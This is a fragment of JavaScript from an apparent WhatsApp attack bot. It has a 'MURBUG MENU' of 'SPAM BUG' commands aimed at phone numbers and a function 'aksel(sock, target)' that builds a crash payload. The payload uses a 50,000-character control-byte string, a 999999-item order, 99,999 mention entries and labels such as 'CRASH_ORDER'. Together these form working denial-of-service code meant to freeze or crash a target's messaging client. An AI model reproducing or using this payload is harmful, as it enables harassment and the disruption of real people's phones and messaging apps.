...
\`\`\`js
╭──〔 𝗠𝗨𝗥𝗕𝗨𝗚 𝗠𝗘𝗡𝗨 〕──╮
│ ↯ /Zverxy 62××      ⇢ SPAM BUG DELAY X BULDO
│ ↯ /ZxycerX 62××   ⇢ SPAM BUG DELAY X BULDO V2
...
𝙠𝙤𝙙𝙚 𝙥𝙖𝙞𝙧𝙞𝙣𝙜 𝙡𝙪 𝙣𝙞𝙝 : ${formattedCode}
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
...
async function aksel(sock, target) {
  const msg = {
  imageMessage: {
    ...
    directPath: "/v/t62.7118-24/739615358_1012616024900454_6531113217436689026_n.enc",
    mediaKeyTimestamp: "1783579277",
    viewOnce: false,
    caption: "DATA_DRAIN",
    jpegThumbnail: "https://files.catbox.moe/hughgc.jpg"
  },
  orderMessage: {
    orderId: "ORDER-999999",
    thumbnail: "https://files.catbox.moe/hughgc.jpg",
    itemCount: 999999,
    status: "INQUIRY",
    surface: "CATALOG",
    message: "ORDER_DRAIN",
    orderTitle: "CRASH_ORDER",
  ...
  extendedTextMessage: {
    text: "\x10".repeat(50000),
    matchedText: "DATA_DRAIN",
    canonicalUrl: "https://mmg.whatsapp.net/v/t62.7118-24/739615358_1012616024900454_6531113217436689026_n.enc",
    description: "DATA_DRAIN",
    title: "CRASH_EXTENDED",
    previewType: "NONE",
    jpegThumbnail: "https://files.catbox.moe/hughgc.jpg",
    contextInfo: {
      mentionedJid: Array.from({ length: 99999 }, () => "6281234567890@s.whatsapp.net"),
